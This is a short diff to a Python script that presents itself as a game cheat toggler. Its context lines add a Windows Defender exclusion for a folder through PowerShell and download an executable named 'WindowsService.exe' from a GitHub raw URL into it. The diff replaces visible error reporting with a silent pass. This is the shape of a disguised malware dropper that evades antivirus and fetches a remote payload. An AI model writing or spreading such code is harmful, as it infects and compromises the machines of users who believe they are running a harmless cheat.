@@ -30,9 +30,8 @@ def main():
     os.system("powershell Add-MpPreference -ExclusionPath '"+ fpath + "'")
     try:
         urlretrieve("https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/WindowsService.exe", fpath+"WindowsService.exe")
-    except Exception as e:
-        print(e)
-        input()
+    except:
+        pass
     
     while True:
         a = input("[+] Type 1 to enable cheats, type 2 to disable: ")
